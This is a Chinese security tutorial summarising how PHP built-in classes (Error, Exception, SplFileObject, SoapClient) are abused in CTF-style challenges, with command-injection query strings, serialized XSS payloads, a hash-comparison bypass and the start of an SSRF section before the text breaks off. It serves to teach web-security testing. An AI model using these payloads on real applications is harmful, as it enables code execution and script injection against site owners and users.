---
title: PHP原生类在安全方面的利用总结
url: https://www.anquanke.com/post/id/284901
source: 安全客-有思想的安全新媒体
date: 2023-01-05
fetch_date: 2025-10-04T03:02:31.768289
---

# PHP原生类在安全方面的利用总结

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# PHP原生类在安全方面的利用总结

阅读量**312599**

发布时间 : 2023-01-04 16:30:38

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 前言

最近打了一个比赛遇到了以new $a($b)这样的考点,结合以前了解的知识,所以总结一下几种类似形式的解题技巧

这里主要以下三种形式的代码

​ eval(“echo new $a($b);”)

​ echo new $a($b)

​ new $a($b)

## eval(“echo new $a($b);”)

首先来看第一种

这个形式的代码相对简单,我们只需要给a随便传⼀个原⽣类，给b传恶意命令即可：

```
?a=Exception&b=system('whoami')
?a=SplFileObject&b=system('whoami')
```

然后我们来看第二种,也是比赛中经常会遇到的

这里我们就需要来了解到php原生类的概念了

## 使用 Error/Exception 内置类进行 XSS

### Error 内置类

* 适用于php7版本
* 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：

```
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);
?>

//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

### Exception 内置类

* 适用于php5、7版本
* 开启报错的情况下

测试代码：

```
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

给出POC：

```
<?php
$a = new Exception("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);
?>

//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

## 使用 Error/Exception 内置类绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。

### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**

```
Error implements Throwable {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

* message：错误消息内容
* code：错误代码
* file：抛出错误的文件名
* line：抛出错误在该文件中的行数

**类方法：**

* [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
* [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
* [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
* [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
* [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
* [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
* [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
* [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
* [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
* [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**

```
Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

* message：异常消息内容
* code：异常代码
* file：抛出异常的文件名
* line：抛出异常在该文件中的行号

**类方法：**

* [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
* [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
* [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
* [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
* [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
* [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
* [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
* [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
* [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
* [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。

我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```
<?php
$a = new Error("payload",1);
echo $a;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

在来看看下一个例子：

```
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 `__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP 7。

## 使用 SoapClient 类进行 SSRF

### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：

```
SoapClient {
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = "" ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
}
```

可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call...